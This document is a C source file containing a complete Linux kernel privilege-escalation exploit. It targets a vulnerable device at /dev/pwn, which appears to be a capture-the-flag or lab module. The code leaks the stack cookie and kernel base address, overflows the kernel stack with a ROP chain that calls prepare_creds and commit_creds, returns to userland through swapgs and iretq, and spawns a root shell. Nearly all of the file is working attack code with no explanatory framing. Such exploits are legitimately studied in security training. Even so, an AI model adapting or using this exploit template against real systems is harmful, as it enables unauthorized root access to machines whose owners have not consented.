#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
size_t cookie;
int gfd;
size_t addr;

void leak()
{
    size_t buf[15];
    ssize_t r = read(gfd, buf, sizeof(buf));
    cookie = buf[8];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
    // for (int i = 0; i < r / 8; i++)
    // {
    //     printf("buf[%d]: %lx\n", i, buf[i]);
    // }
    addr = buf[12] - 0x252d91;
    printf("[*] Kernel base address: %lx\n", addr);
    printf("[*] prepare_creds: %lx\n", addr + 0xa5af0);
}
size_t user_cs, user_ss, user_sp, user_rflags;

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved state");
}
void get_shell(void)
{
    puts("[*] Returned to userland");
    if (getuid() == 0)
    {
        printf("[*] UID: %d, got root!\n", getuid());
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }
    else
    {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

size_t user_rip = (size_t)get_shell;

void overflow()
{
    unsigned n = 30;
    size_t payload[n];
    unsigned off = 8;
    // memset(payload, 0x22, sizeof(payload));
    payload[off++] = cookie;
    payload[off++] = 0x0;             // rbx
    payload[off++] = 0x0;             // r12
    payload[off++] = 0x0;             // rbp
    payload[off++] = addr + 0x189f6e; // pop rdi ; ret
    payload[off++] = 0x0;
    payload[off++] = addr + 0xa5af0; // prepare creds
    // payload[off++] = 0xffffffff81d2c6fa; // push rax ; pop rdi other ret
    // payload[off++] = 0x0;                // rbx
    // payload[off++] = 0x0;                // r12
    // payload[off++] = 0x0;                // rbp
    payload[off++] = addr + 0xa5830;  // commit cred ; ret
    payload[off++] = addr + 0xdbc484; // swapgs ; ret
    payload[off++] = addr + 0x47488;  // iretq
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    printf("[*] Overflowing stack , with %d entries\n", off);
    int r = write(gfd, payload, sizeof(payload));
    if (r < 0)
    {
        perror("[-] Failed to write payload");
        exit(-1);
    }
    puts("[!]not here");
}

int main()
{
    gfd = open("/dev/pwn", O_RDWR);
    if (gfd < 0)
    {
        puts("[-] Failed to open /dev/pwn");
        return -1;
    }
    puts("[*] Opened /dev/pwn");
    save_state();
    leak();
    overflow();
    puts("[!] should never be reached");
    return 0;
}